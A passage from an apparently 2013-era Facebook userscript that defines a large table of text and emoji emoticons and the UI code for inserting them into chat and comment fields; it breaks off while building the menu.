// ==UserScript==
// @name    	Chat Emoticons 2K13
// @namespace	NewFacebook Emoticons for Status, Chat and Comment!
// @description	NewFacebook 2K13 Emoticons for Status, Chat and Comment.
// @version 	1.0
// @author  	Shaik Abdul Javeed
// @authorURL	http://www.facebook.com/skjaveed.baba
// @include 	http://www.facebook.com/*
// @include 	https://www.facebook.com/*
// ==/UserScript==
(function() {
	
	if (!document.querySelector("#pageNav")) {
		return;
	}
	//console.info("Extra Facebook Smileys");

	// = Data =======
	var emoticons = [ { // Text to picture emoticons
"chars" : " :) ",
		"class" : "emoticon_smile",
		"name" : "Smiley"
	}, {
		"chars" : " :( ",
		"class" : "emoticon_frown",
		"name" : "Frown"
	}, {
		"chars" : " :P ",
		"class" : "emoticon_tongue",
		"name" : "Tongue"
	}, {
        "chars" : " :D ",
		"class" : "emoticon_grin",
		"name" : "Grin"
	}, {
		"chars" : " :o ",
		"class" : "emoticon_gasp",
		"name" : "Gasp"
	}, {
		"chars" : " ;) ",
		"class" : "emoticon_wink",
		"name" : "Wink"
	}, {
		"chars" : " :v ",
		"class" : "emoticon_pacman",
		"name" : "Pacman"
	}, {
		"chars" : " >:( ",
		"class" : "emoticon_grumpy",
		"name" : "Gruñón"
	}, {
		"chars" : " :/ ",
		"class" : "emoticon_unsure",
		"name" : "Unsure"
	}, {
		"chars" : " :'( ",
		"class" : "emoticon_cry",
		"name" : "Cry"
	}, {
		"chars" : " ^_^ ",
		"class" : "emoticon_kiki",
		"name" : "Kiki"
	}, {
		"chars" : " 8) ",
		"class" : "emoticon_glasses",
		"name" : "Glasses"
	}, {
		"chars" : " B| ",
		"class" : "emoticon_sunglasses",
		"name" : "Sunglasses"
	}, {
		"chars" : " <3 ",
		"class" : "emoticon_heart",
		"name" : "Heart"
	}, {
		"chars" : " 3:) ",
		"class" : "emoticon_devil",
		"name" : "Devil"
	}, {
		"chars" : " O:) ",
		"class" : "emoticon_angel",
		"name" : "Angel"
	}, {
		"chars" : " -_- ",
		"class" : "emoticon_squint",
		"name" : "Squint"
	}, {
		"chars" : " o.O ",
		"class" : "emoticon_confused",
		"name" : "Confused"
	}, {
		"chars" : " >:o ",
		"class" : "emoticon_upset",
		"name" : "Upset"
	}, {
		"chars" : " :3 ",
		"class" : "emoticon_colonthree",
		"name" : "Colonthree"
	}, {
		"chars" : " (y) ",
		"class" : "emoticon_like",
		"name" : "Like"
	}, {
		"chars" : " :* ",
		"class" : "emoticon emoticon_kiss",
		"name" : "Kiss"
	}, {
		"chars" : " (^^^) ",
		"class" : "emoticon_shark",
		"name" : "Shark"
	}, {
		"chars" : " :|] ",
		"class" : "emoticon_robot",
		"name" : "Robot"
	}, {
		"chars" : " <(\") ",
		"class" : "emoticon_penguin",
		"name" : "Pingüino"
	}, {
		"chars" : " :poop: ",
		"class" : "emoticon_poop",
		"name" : "Poop"
        }, {
		"chars" : " :putnam: ",
		"class" : "emoticon_putnam",
		"name" : "Putman"
	}, {
		"chars" : " \ud83c\udf02 ",
		"class" : "_1az _1a- _2c0",
		"name" : "Pink Umbrella"
	}, {
		"chars" : " \ud83c\udf0a ",
		"class" : "_1az _1a- _2c1",
		"name" : "Sea Wave"
	}, {
		"chars" : " \ud83c\udf19 ",
		"class" : "_1az _1a- _2c2",
		"name" : "Crescent moon"
	}, {
		"chars" : " \ud83c\udf1f ",
		"class" : "_1az _1a- _2c3",
		"name" : "Bright Star"
	}, {
		"chars" : " \ud83c\udf31 ",
		"class" : "_1az _1a- _2c4",
		"name" : "Seedbed"
	}, {
		"chars" : " \ud83c\udf34 ",
		"class" : "_1az _1a- _2c5",
		"name" : "Single Palm Tree"
	}, {
		"chars" : " \ud83c\udf35 ",
		"class" : "_1az _1a- _2c6",
		"name" : "Cactus"
	}, {
		"chars" : " \ud83c\udf37 ",
		"class" : "_1az _1a- _2c7",
		"name" : "Tulip"
	}, {
		"chars" : " \ud83c\udf38 ",
		"class" : "_1az _1a- _2c8",
		"name" : "Cherry Blossom"
	}, {
		"chars" : " \ud83c\udf39 ",
		"class" : "_1az _1a- _2c9",
		"name" : "Rose"
	}, {
		"chars" : " \ud83c\udf3a ",
		"class" : "_1az _1a- _2ca",
		"name" : "Cayenne"
	}, {
		"chars" : " \ud83c\udf3b ",
		"class" : "_1az _1a- _2cb",
		"name" : "Sunflower"
	}, {
		"chars" : " \ud83c\udf3e ",
		"class" : "_1az _1a- _2cc",
		"name" : "Ear Of Rice"
	}, {
		"chars" : " \ud83c\udf40 ",
		"class" : "_1az _1a- _2cd",
		"name" : "Four Leaf Clover"
	}, {
		"chars" : " \ud83c\udf41 ",
		"class" : "_1az _1a- _2ce",
		"name" : "Maple Leaf"
	}, {
		"chars" : " \ud83c\udf42 ",
		"class" : "_1az _1a- _2cf",
		"name" : "Fallen Leaf"
	}, {
		"chars" : " \ud83c\udf43 ",
		"class" : "_1az _1a- _2cg",
		"name" : "Leaf Floating In The Wind"
	}, {
		"chars" : " \ud83c\udf4a ",
		"class" : "_1az _1a- _2ch",
		"name" : "Tangerine"
	}, {
		"chars" : " \ud83c\udf4e ",
		"class" : "_1az _1a- _2ci",
		"name" : "Red Apple"
	}, {
		"chars" : " \ud83c\udf53 ",
		"class" : "_1az _1a- _2cj",
		"name" : "Strawberry"
	}, {
		"chars" : " \ud83c\udf54 ",
		"class" : "_1az _1a- _2ck",
		"name" : "Burger"
	}, {
		"chars" : " \ud83c\udf78 ",
		"class" : "_1az _1a- _2cl",
		"name" : "Cocktail Glass"
	}, {
		"chars" : " \ud83c\udf7a ",
		"class" : "_1az _1a- _2cm",
		"name" : "Tankard"
	}, {
		"chars" : " \ud83c\udf81 ",
		"class" : "_1az _1a- _2cn",
		"name" : "Gift Wrapped"
	}, {
		"chars" : " \ud83c\udf83 ",
		"class" : "_1az _1a- _2co",
		"name" : "Pumpkin With Candle"
	}, {
		"chars" : " \ud83c\udf84 ",
		"class" : "_1az _1a- _2cp",
		"name" : "Christmas Tree"
	}, {
		"chars" : " \ud83c\udf85 ",
		"class" : "_1az _1a- _2cq",
		"name" : "Santa"
	}, {
		"chars" : " \ud83c\udf88 ",
		"class" : "_1az _1a- _2cr",
		"name" : "Balloon"
	}, {
		"chars" : " \ud83c\udf89 ",
		"class" : "_1az _1a- _2cs",
		"name" : "Party Popper"
	}, {
		"chars" : " \ud83c\udf8d ",
		"class" : "_1az _1a- _2ct",
		"name" : "Pine Decor"
	}, {
		"chars" : " \ud83c\udf8e ",
		"class" : "_1az _1a- _2cu",
		"name" : "Japanese Dolls"
	}, {
		"chars" : " \ud83c\udf8f ",
		"class" : "_1az _1a- _2cv",
		"name" : "Carp Streamer"
	}, {
		"chars" : " \ud83c\udf90 ",
		"class" : "_1az _1a- _2cw",
		"name" : "Wind Chime"
	}, {
		"chars" : " \ud83c\udf93 ",
		"class" : "_1az _1a- _2cx",
		"name" : "Graduation Cap"
	}, {
		"chars" : " \ud83c\udfb5 ",
		"class" : "_1az _1a- _2cy",
		"name" : "Musical Note"
	}, {
		"chars" : " \ud83c\udfb6 ",
		"class" : "_1az _1a- _2cz",
		"name" : "Multiple Musical Notes"
	}, {
		"chars" : " \ud83c\udfbc ",
		"class" : "_1az _1a- _2c-",
		"name" : "Musical Score"
	}, {
		"chars" : " \ud83d\udc0d ",
		"class" : "_1az _1a- _2c_",
		"name" : "Snake"
	}, {
		"chars" : " \ud83d\udc0e ",
		"class" : "_1az _1a- _2d0",
		"name" : "Horse"
	}, {
		"chars" : " \ud83d\udc11 ",
		"class" : "_1az _1a- _2d1",
		"name" : "Sheep"
	}, {
		"chars" : " \ud83d\udc12 ",
		"class" : "_1az _1a- _2d2",
		"name" : "Monkey"
	}, {
		"chars" : " \ud83d\udc14 ",
		"class" : "_1az _1a- _2d3",
		"name" : "Hen"
	}, {
		"chars" : " \ud83d\udc17 ",
		"class" : "_1az _1a- _2d4",
		"name" : "Wild Boar"
	}, {
		"chars" : " \ud83d\udc18 ",
		"class" : "_1az _1a- _2d5",
		"name" : "Elephant"
	}, {
		"chars" : " \ud83d\udc19 ",
		"class" : "_1az _1a- _2d6",
		"name" : "Octopus"
	}, {
		"chars" : " \ud83d\udc1a ",
		"class" : "_1az _1a- _2d7",
		"name" : "Snail Shell"
	}, {
		"chars" : " \ud83d\udc1b ",
		"class" : "_1az _1a- _2d8",
		"name" : "Insect"
	}, {
		"chars" : " \ud83d\udc1f ",
		"class" : "_1az _1a- _2d9",
		"name" : "Fish"
	}, {
		"chars" : " \ud83d\udc20 ",
		"class" : "_1az _1a- _2da",
		"name" : "Tropical Fish"
	}, {
		"chars" : " \ud83d\udc21 ",
		"class" : "_1az _1a- _2db",
		"name" : "Pufferfish"
	}, {
		"chars" : " \ud83d\udc25 ",
		"class" : "_1az _1a- _2dc",
		"name" : "Chick In Front"
	}, {
		"chars" : " \ud83d\udc26 ",
		"class" : "_1az _1a- _2dd",
		"name" : "Bird"
	}, {
		"chars" : " \ud83d\udc27 ",
		"class" : "_1az _1a- _2de",
		"name" : "Penguin"
	}, {
		"chars" : " \ud83d\udc28 ",
		"class" : "_1az _1a- _2df",
		"name" : "Koala"
	}, {
		"chars" : " \ud83d\udc29 ",
		"class" : "_1az _1a- _2dg",
		"name" : "Poodle"
	}, {
		"chars" : " \ud83d\udc2b ",
		"class" : "_1az _1a- _2dh",
		"name" : "Bactrian Camel"
	}, {
		"chars" : " \ud83d\udc2c ",
		"class" : "_1az _1a- _2di",
		"name" : "Dolphin"
	}, {
		"chars" : " \ud83d\udc2d ",
		"class" : "_1az _1a- _2dj",
		"name" : "Mouse Face"
	}, {
		"chars" : " \ud83d\udc2e ",
		"class" : "_1az _1a- _2dk",
		"name" : "Cow Face"
	}, {
		"chars" : " \ud83d\udc2f ",
		"class" : "_1az _1a- _2dl",
		"name" : "Cara de tigre"
	}, {
		"chars" : " \ud83d\udc30 ",
		"class" : "_1az _1a- _2dm",
		"name" : "Rabbit Face"
	}, {
		"chars" : " \ud83d\udc31 ",
		"class" : "_1az _1a- _2dn",
		"name" : "Cat Face"
	}, {
		"chars" : " \ud83d\udc33 ",
		"class" : "_1az _1a- _2do",
		"name" : "Whale Sputtering"
	}, {
		"chars" : " \ud83d\udc34 ",
		"class" : "_1az _1a- _2dp",
		"name" : "Horse Face"
	}, {
		"chars" : " \ud83d\udc35 ",
		"class" : "_1az _1a- _2dq",
		"name" : "Monkey Face"
	}, {
		"chars" : " \ud83d\udc37 ",
		"class" : "_1az _1a- _2dr",
		"name" : "Pig face"
	}, {
		"chars" : " \ud83d\udc38 ",
		"class" : "_1az _1a- _2ds",
		"name" : "Frog Face"
	}, {
		"chars" : " \ud83d\udc39 ",
		"class" : "_1az _1a- _2dt",
		"name" : "Hamster Face"
	}, {
		"chars" : " \ud83d\udc3a ",
		"class" : "_1az _1a- _2du",
		"name" : "Wolf Face"
	}, {
		"chars" : " \ud83d\udc3b ",
		"class" : "_1az _1a- _2dv",
		"name" : "Bear Face"
	}, {
		"chars" : " \ud83d\udc3e ",
		"class" : "_1az _1a- _2dw",
		"name" : "Footprints"
	}, {
		"chars" : " \ud83d\udc40 ",
		"class" : "_1az _1a- _2dx",
		"name" : "Eyes"
	}, {
		"chars" : " \ud83d\udc42 ",
		"class" : "_1az _1a- _2dy",
		"name" : "Ear"
	}, {
		"chars" : " \ud83d\udc43 ",
		"class" : "_1az _1a- _2dz",
		"name" : "Nose"
	}, {
		"chars" : " \ud83d\udc44 ",
		"class" : "_1az _1a- _2d-",
		"name" : "Mouth"
	}, {
		"chars" : " \ud83d\udc45 ",
		"class" : "_1az _1a- _2d_",
		"name" : "Sour Face"
	}, {
		"chars" : " \ud83d\udc46 ",
		"class" : "_1az _1a- _2e0",
		"name" : "White hand pointing up"
	}, {
		"chars" : " \ud83d\udc47 ",
		"class" : "_1az _1a- _2e1",
		"name" : "White hand faces downward"
	}, {
		"chars" : " \ud83d\udc48 ",
		"class" : "_1az _1a- _2e2",
		"name" : "White hand indicating left"
	}, {
		"chars" : " \ud83d\udc49 ",
		"class" : "_1az _1a- _2e3",
		"name" : "White hand indicating right"
	}, {
		"chars" : " \ud83d\udc4a ",
		"class" : "_1az _1a- _2e4",
		"name" : "Fist"
	}, {
		"chars" : " \ud83d\udc4b ",
		"class" : "_1az _1a- _2e5",
		"name" : "Hand in motion"
	}, {
		"chars" : " \ud83d\udc4c ",
		"class" : "_1az _1a- _2e6",
		"name" : "Hand showing all good"
	}, {
		"chars" : " \ud83d\udc4d ",
		"class" : "_1az _1a- _2e7",
		"name" : "Hand with thumb up"
	}, {
		"chars" : " \ud83d\udc4e ",
		"class" : "_1az _1a- _2e8",
		"name" : "Hand with thumb down"
	}, {
		"chars" : " \ud83d\udc4f ",
		"class" : "_1az _1a- _2e9",
		"name" : "Hands clapping"
	}, {
		"chars" : " \ud83d\udc50 ",
		"class" : "_1az _1a- _2ea",
		"name" : "Open Hands"
	}, {
		"chars" : " \ud83d\udc66 ",
		"class" : "_1az _1a- _2eb",
		"name" : "Boy"
	}, {
		"chars" : " \ud83d\udc67 ",
		"class" : "_1az _1a- _2ec",
		"name" : "Girl"
	}, {
		"chars" : " \ud83d\udc68 ",
		"class" : "_1az _1a- _2ed",
		"name" : "Man"
	}, {
		"chars" : " \ud83d\udc69 ",
		"class" : "_1az _1a- _2ee",
		"name" : "Woman"
	}, {
		"chars" : " \ud83d\udc6b ",
		"class" : "_1az _1a- _2ef",
		"name" : "Man and woman holding hands"
	}, {
		"chars" : " \ud83d\udc6e ",
		"class" : "_1az _1a- _2eg",
		"name" : "Police Officer"
	}, {
		"chars" : " \ud83d\udc6f ",
		"class" : "_1az _1a- _2eh",
		"name" : "Woman with bunny ears"
	}, {
		"chars" : " \ud83d\udc71 ",
		"class" : "_1az _1a- _2ei",
		"name" : "Person with hair rubio"
	}, {
		"chars" : " \ud83d\udc72 ",
		"class" : "_1az _1a- _2ej",
		"name" : "Man with pi mao gua"
	}, {
		"chars" : " \ud83d\udc73 ",
		"class" : "_1az _1a- _2ek",
		"name" : "Man with turban"
	}, {
		"chars" : " \ud83d\udc74 ",
		"class" : "_1az _1a- _2el",
		"name" : "Old Man"
	}, {
		"chars" : " \ud83d\udc75 ",
		"class" : "_1az _1a- _2em",
		"name" : "Old Woman"
	}, {
		"chars" : " \ud83d\udc76 ",
		"class" : "_1az _1a- _2en",
		"name" : "Baby"
	}, {
		"chars" : " \ud83d\udc77 ",
		"class" : "_1az _1a- _2eo",
		"name" : "Construction Worker"
	}, {
		"chars" : " \ud83d\udc78 ",
		"class" : "_1az _1a- _2ep",
		"name" : "Princess"
	}, {
		"chars" : " \ud83d\udc7b ",
		"class" : "_1az _1a- _2eq",
		"name" : "Ghost"
	}, {
		"chars" : " \ud83d\udc7c ",
		"class" : "_1az _1a- _2er",
		"name" : "Angel baby"
	}, {
		"chars" : " \ud83d\udc7d ",
		"class" : "_1az _1a- _2es",
		"name" : "Alien"
	}, {
		"chars" : " \ud83d\udc7e ",
		"class" : "_1az _1a- _2et",
		"name" : "Alien Monster"
	}, {
		"chars" : " \ud83d\udc7f ",
		"class" : "_1az _1a- _2eu",
		"name" : "Imp"
	}, {
		"chars" : " \ud83d\udc80 ",
		"class" : "_1az _1a- _2ev",
		"name" : "Skull"
	}, {
		"chars" : " \ud83d\udc82 ",
		"class" : "_1az _1a- _2ew",
		"name" : "Guard"
	}, {
		"chars" : " \ud83d\udc83 ",
		"class" : "_1az _1a- _2ex",
		"name" : "Ballerina"
	}, {
		"chars" : " \ud83d\udc85 ",
		"class" : "_1az _1a- _2ey",
		"name" : "Nail Polish"
	}, {
		"chars" : " \ud83d\udc8b ",
		"class" : "_1az _1a- _2ez",
		"name" : "Brand of kiss"
	}, {
		"chars" : " \ud83d\udc8f ",
		"class" : "_1az _1a- _2e-",
		"name" : "Kissing couple"
	}, {
		"chars" : " \ud83d\udc90 ",
		"class" : "_1az _1a- _2e_",
		"name" : "Bunch of flowers"
	}, {
		"chars" : " \ud83d\udc91 ",
		"class" : "_1az _1a- _2f0",
		"name" : "Couple with heart"
	}, {
		"chars" : " \ud83d\udc93 ",
		"class" : "_1az _1a- _2f1",
		"name" : "Heart beating"
	}, {
		"chars" : " \ud83d\udc94 ",
		"class" : "_1az _1a- _2f2",
		"name" : "Broken Heart"
	}, {
		"chars" : " \ud83d\udc96 ",
		"class" : "_1az _1a- _2f3",
		"name" : "Bright Heart"
	}, {
		"chars" : " \ud83d\udc97 ",
		"class" : "_1az _1a- _2f4",
		"name" : "Heart growing"
	}, {
		"chars" : " \ud83d\udc98 ",
		"class" : "_1az _1a- _2f5",
		"name" : "Heart with arrow"
	}, {
		"chars" : " \ud83d\udc99 ",
		"class" : "_1az _1a- _2f6",
		"name" : "Blue Heart"
	}, {
		"chars" : " \ud83d\udc9a ",
		"class" : "_1az _1a- _2f7",
		"name" : "Green Heart"
	}, {
		"chars" : " \ud83d\udc9b ",
		"class" : "_1az _1a- _2f8",
		"name" : "Yellow Heart"
	}, {
		"chars" : " \ud83d\udc9c ",
		"class" : "_1az _1a- _2f9",
		"name" : "Purple Heart"
	}, {
		"chars" : " \ud83d\udc9d ",
		"class" : "_1az _1a- _2fa",
		"name" : "Heart with ribbon"
	}, {
		"chars" : " \ud83d\udca2 ",
		"class" : "_1az _1a- _2fb",
		"name" : "Symbol of anger"
	}, {
		"chars" : " \ud83d\udca4 ",
		"class" : "_1az _1a- _2fc",
		"name" : "Sleeping"
	}, {
		"chars" : " \ud83d\udca6 ",
		"class" : "_1az _1a- _2fd",
		"name" : "Sweat Symbol"
	}, {
		"chars" : " \ud83d\udca8 ",
		"class" : "_1az _1a- _2fe",
		"name" : "Quick Start Symbol"
	}, {
		"chars" : " \ud83d\udca9 ",
		"class" : "_1az _1a- _2ff",
		"name" : "Pile of Caca"
	}, {
		"chars" : " \ud83d\udcaa ",
		"class" : "_1az _1a- _2fg",
		"name" : "Flexed bicep"
	}, {
		"chars" : " \ud83d\udcbb ",
		"class" : "_1az _1a- _2fh",
		"name" : "Personal Computer"
	}, {
		"chars" : " \ud83d\udcbd ",
		"class" : "_1az _1a- _2fi",
		"name" : "Mini Disco"
	}, {
		"chars" : " \ud83d\udcbe ",
		"class" : "_1az _1a- _2fj",
		"name" : "Floppy disk"
	}, {
		"chars" : " \ud83d\udcbf ",
		"class" : "_1az _1a- _2fk",
		"name" : "Optical Disc"
	}, {
		"chars" : " \ud83d\udcc0 ",
		"class" : "_1az _1a- _2fl",
		"name" : "DVD"
	}, {
		"chars" : " \ud83d\udcde ",
		"class" : "_1az _1a- _2fm",
		"name" : "Telephone receiver"
	}, {
		"chars" : " \ud83d\udce0 ",
		"class" : "_1az _1a- _2fn",
		"name" : "Fax"
	}, {
		"chars" : " \ud83d\udcf1 ",
		"class" : "_1az _1a- _2fo",
		"name" : "Mobile Phone"
	}, {
		"chars" : " \ud83d\udcf2 ",
		"class" : "_1az _1a- _2fp",
		"name" : "Mobile phone with arrow from left to right"
	}, {
		"chars" : " \ud83d\udcfa ",
		"class" : "_1az _1a- _2fq",
		"name" : "Television"
	}, {
		"chars" : " \ud83d\udd14 ",
		"class" : "_1az _1a- _2fr",
		"name" : "Bell"
	}, {
		"chars" : " \ud83d\ude01 ",
		"class" : "_1az _1a- _2fs",
		"name" : "Face to face with smiling eyes"
	}, {
		"chars" : " \ud83d\ude02 ",
		"class" : "_1az _1a- _2ft",
		"name" : "Face with tears of joy"
	}, {
		"chars" : " \ud83d\ude03 ",
		"class" : "_1az _1a- _2fu",
		"name" : "Smiley face with open mouth"
	}, {
		"chars" : " \ud83d\ude04 ",
		"class" : "_1az _1a- _2fv",
		"name" : "Face and eyes smiling with mouth open"
	}, {
		"chars" : " \ud83d\ude06 ",
		"class" : "_1az _1a- _2fw",
		"name" : "Smiley face with mouth open and eyes closed"
	}, {
		"chars" : " \ud83d\ude09 ",
		"class" : "_1az _1a- _2fx",
		"name" : "Face winking eye"
	}, {
		"chars" : " \ud83d\ude0b ",
		"class" : "_1az _1a- _2fy",
		"name" : "Guy savoring delicious food"
	}, {
		"chars" : " \ud83d\ude0c ",
		"class" : "_1az _1a- _2fz",
		"name" : "Relief face"
	}, {
		"chars" : " \ud83d\ude0d ",
		"class" : "_1az _1a- _2f-",
		"name" : "Smiley face with heart shaped eyes"
	}, {
		"chars" : " \ud83d\ude0f ",
		"class" : "_1az _1a- _2f_",
		"name" : "Smirk face"
	}, {
		"chars" : " \ud83d\ude12 ",
		"class" : "_1az _1a- _2g0",
		"name" : "Face of boredom"
	}, {
		"chars" : " \ud83d\ude13 ",
		"class" : "_1az _1a- _2g1",
		"name" : "Face with cold sweat"
	}, {
		"chars" : " \ud83d\ude14 ",
		"class" : "_1az _1a- _2g2",
		"name" : "Pensive face"
	}, {
		"chars" : " \ud83d\ude16 ",
		"class" : "_1az _1a- _2g3",
		"name" : "Confused face"
	}, {
		"chars" : " \ud83d\ude18 ",
		"class" : "_1az _1a- _2g4",
		"name" : "Throwing kiss Face"
	}, {
		"chars" : " \ud83d\ude1a ",
		"class" : "_1az _1a- _2g5",
		"name" : "Kissing face with eyes closed"
	}, {
		"chars" : " \ud83d\ude1c ",
		"class" : "_1az _1a- _2g6",
		"name" : "Face with tongue out and winking"
	}, {
		"chars" : " \ud83d\ude1d ",
		"class" : "_1az _1a- _2g7",
		"name" : "Face with tongue hanging out and eyes closed"
	}, {
		"chars" : " \ud83d\ude1e ",
		"class" : "_1az _1a- _2g8",
		"name" : "Face discouraged"
	}, {
		"chars" : " \ud83d\ude20 ",
		"class" : "_1az _1a- _2g9",
		"name" : "Face of anger"
	}, {
		"chars" : " \ud83d\ude21 ",
		"class" : "_1az _1a- _2ga",
		"name" : "Very angry face"
	}, {
		"chars" : " \ud83d\ude22 ",
		"class" : "_1az _1a- _2gb",
		"name" : "Crying Face"
	}, {
		"chars" : " \ud83d\ude23 ",
		"class" : "_1az _1a- _2gc",
		"name" : "Face of perseverance"
	}, {
		"chars" : " \ud83d\ude24 ",
		"class" : "_1az _1a- _2gd",
		"name" : "Face of triumph"
	}, {
		"chars" : " \ud83d\ude25 ",
		"class" : "_1az _1a- _2ge",
		"name" : "Face discouraged but relieved"
	}, {
		"chars" : " \ud83d\ude28 ",
		"class" : "_1az _1a- _2gf",
		"name" : "Scary face"
	}, {
		"chars" : " \ud83d\ude29 ",
		"class" : "_1az _1a- _2gg",
		"name" : "Fatigued face"
	}, {
		"chars" : " \ud83d\ude2a ",
		"class" : "_1az _1a- _2gh",
		"name" : "Sleeping face"
	}, {
		"chars" : " \ud83d\ude2b ",
		"class" : "_1az _1a- _2gi",
		"name" : "Tired face"
	}, {
		"chars" : " \ud83d\ude2d ",
		"class" : "_1az _1a- _2gj",
		"name" : "Face screaming"
	}, {
		"chars" : " \ud83d\ude30 ",
		"class" : "_1az _1a- _2gk",
		"name" : "Face with mouth open and cold sweat"
	}, {
		"chars" : " \ud83d\ude31 ",
		"class" : "_1az _1a- _2gl",
		"name" : "Terrified face of fear"
	}, {
		"chars" : " \ud83d\ude32 ",
		"class" : "_1az _1a- _2gm",
		"name" : "Very surprised face"
	}, {
		"chars" : " \ud83d\ude33 ",
		"class" : "_1az _1a- _2gn",
		"name" : "Face flushed"
	}, {
		"chars" : " \ud83d\ude35 ",
		"class" : "_1az _1a- _2go",
		"name" : "Face dizzy"
	}, {
		"chars" : " \ud83d\ude37 ",
		"class" : "_1az _1a- _2gp",
		"name" : "Face with medical mask"
	}, {
		"chars" : " \ud83d\ude38 ",
		"class" : "_1az _1a- _2gq",
		"name" : "Grinning Cat face and eyes closed"
	}, {
		"chars" : " \ud83d\ude39 ",
		"class" : "_1az _1a- _2gr",
		"name" : "Cat face with tears of laughter"
	}, {
		"chars" : " \ud83d\ude3a ",
		"class" : "_1az _1a- _2gs",
		"name" : "Smiling cat face with open mouth"
	}, {
		"chars" : " \ud83d\ude3b ",
		"class" : "_1az _1a- _2gt",
		"name" : "Smiling cat face with hearts in her eyes"
	}, {
		"chars" : " \ud83d\ude3c ",
		"class" : "_1az _1a- _2gu",
		"name" : "Face of cat smile twisted"
	}, {
		"chars" : " \ud83d\ude3d ",
		"class" : "_1az _1a- _2gv",
		"name" : "Cat face kissing with eyes closed"
	}, {
		"chars" : " \ud83d\ude3f ",
		"class" : "_1az _1a- _2gw",
		"name" : "Cat face crying"
	}, {
		"chars" : " \ud83d\ude40 ",
		"class" : "_1az _1a- _2gx",
		"name" : "Cat face scared terrified"
	}, {
		"chars" : " \ud83d\ude4b ",
		"class" : "_1az _1a- _2gy",
		"name" : "Happy person raising a hand"
	}, {
		"chars" : " \ud83d\ude4c ",
		"class" : "_1az _1a- _2gz",
		"name" : "Person holding up both hands in celebration"
	}, {
		"chars" : " \ud83d\ude4d ",
		"class" : "_1az _1a- _2g-",
		"name" : "Person frowning"
	}, {
		"chars" : " \ud83d\ude4f ",
		"class" : "_1az _1a- _2g_",
		"name" : "Person in prayer"
	}, {
		"chars" : " \u261d ",
		"class" : "_1az _1a- _2h0",
		"name" : "Index finger pointing up"
	}, {
		"chars" : " \u263a ",
		"class" : "_1az _1a- _2h1",
		"name" : "White face smiling"
	}, {
		"chars" : " \u26a1 ",
		"class" : "_1az _1a- _2h2",
		"name" : "High voltage symbol"
	}, {
		"chars" : " \u26c4 ",
		"class" : "_1az _1a- _2h3",
		"name" : "Snowless snowman"
	}, {
		"chars" : " \u270a ",
		"class" : "_1az _1a- _2h4",
		"name" : "Fist up"
	}, {
		"chars" : " \u270b ",
		"class" : "_1az _1a- _2h5",
		"name" : "Hand pointing up"
	}, {
		"chars" : " \u270c ",
		"class" : "_1az _1a- _2h6",
		"name" : "Winning Hand"
	}, {
		"chars" : " \u2600 ",
		"class" : "_1az _1a- _2h7",
		"name" : "Sun With Rays"
	}, {
		"chars" : " \u2601 ",
		"class" : "_1az _1a- _2h8",
		"name" : "Cloud"
	}, {
		"chars" : " \u2614 ",
		"class" : "_1az _1a- _2h9",
		"name" : "Umbrella With Rain Drops"
	}, {
		"chars" : " \u2615 ",
		"class" : "_1az _1a- _2ha",
		"name" : "Hot Drink"
	}, {
		"chars" : " \u2728 ",
		"class" : "_1az _1a- _2hb",
		"name" : "Brightness"
	}, {
		"chars" : " \u2764 ",
		"class" : "_1az _1a- _2hc",
		"name" : "Heavy Black Heart"
	} ];

	// = Variables =======
	var lastActiveElement = document.activeElement;

	// = Functions =======
	function createElement(html) {
		var outerHTML = document.createElement("div");
		outerHTML.innerHTML = html;
		return outerHTML.firstChild;
	}

	function htmlSpecialChars(string) {
		var div = document.createElement("div");
		var text = document.createTextNode(string);
		div.appendChild(text);
		return div.innerHTML;
	}

	function isInstanceOfTextInput(element) {
		return (element instanceof HTMLInputElement && element.type == "text")
				|| element instanceof HTMLTextAreaElement;
	}

	function isFlyoutOpen(flyout) {
		return flyout.className == "openToggler";
	}

	function openFlyout(flyout, open) {
		if (open === undefined) {
			open = !isFlyoutOpen(flyout); // Toggle
		}

		if (open) {
			flyout.className = "openToggler";
		} else {
			flyout.removeAttribute("class");
		}
	}

	function createTab(titleContainer, bodyContainer) {
		var html;
		// Tab; default = inactive
	    html = '<li class="jewelFlyout fbJewelFlyout uiToggleFlyout">';
		html += '<div class="jewelFlyout">';
		html += '</div>';
		html += '</li>';
		var title = createElement(html);
		titleContainer.appendChild(title);

		// Manual input
		html = '<div style="display: none;">';
		html += '</div>';
		var body = createElement(html);
		bodyContainer.appendChild(body);

		// Change tab listener
		(function(body) {
			title.addEventListener("click", function() {
				// Change tab
				var titles = this.parentNode.childNodes; // tab.tabContainer.childNodes
				for ( var t = 0; t < titles.length; t++) {
					if (titles[t] === this) { // Active
						
					} else { // Inactive
						titles[t].style.background = "";
						titles[t].firstChild.style.color = "";
					}
				}

				// Change body
				var bodies = body.parentNode.childNodes; // body.bodyContainer.childNodes
				for ( var b = 0; b < bodies.length; b++) {
					if (bodies[b] === body) { // Show
						body.style.display = "";
					} else { // Hide
						bodies[b].style.display = "none";
					}
				}
			});
		})(body);

		return {
			"title" : title.firstChild,
			"body" : body
		};
	}

	function createTabListBody(emoticons, filter) {
		var html;

		html = '<div style="max-height: 200px; padding-right: 15px; overflow-x: hidden; line-height: 1em;">';
		html += '<div style="padding: 10px; width: 200px; font-size: 15px;">';
		html += '</div>';
		html += '</div>';
		var body = createElement(html).firstChild;
		for ( var e = 0; e < emoticons.length; e++) {
			var emoticon = emoticons[e];
			if (!filter(emoticon)) {
				continue;
			}

			// Icons
			html = '<span class="panelCell" style="display: inline-block; vertical-align: middle; padding: 2px;">';
			html += '<a';
			html += ' class="emoticon'
					+ (emoticon.class !== undefined ? ' ' + emoticon.class : '')
					+ '"';
			html += ' style="text-decoration: inherit; color: inherit;'
					+ (emoticon.class !== undefined ? ' color: transparent;'
							: ' width: auto;') + '"';
			html += (emoticon.name !== undefined ? ' title="' + emoticon.name
					+ '"' : '');
			html += '>';
			html += htmlSpecialChars(emoticon.chars);
			html += '</a>';
			html += '</span>';
			var cell = createElement(html);
			body.appendChild(cell);

			// Select emoticon listener
			var emoticonA = cell.firstChild;
			(function(emoticon) {
				emoticonA.addEventListener("click", function() {
					if (isInstanceOfTextInput(lastActiveElement)) {
						lastActiveElement.focus();

						var chars = emoticon.chars;
						var value = lastActiveElement.value;
						var start = lastActiveElement.selectionStart;
						var end = lastActiveElement.selectionEnd;
						lastActiveElement.value = value.substring(0, start)
								+ chars + value.substring(end);
						lastActiveElement.setSelectionRange(start + chars.length, start + chars.length);
					}

					openFlyoutCommand = false; // Close flyout
				});
			})(emoticon);
		}

		return body.parentNode;
	}

	// = Construct UI =======
	var html;

	// Menu item
	// var navItem
	html = '<li class="navItem middleItem notifNegativeBase">';
	html += '<div class="fbJewel">';
	// {

	// Toggler
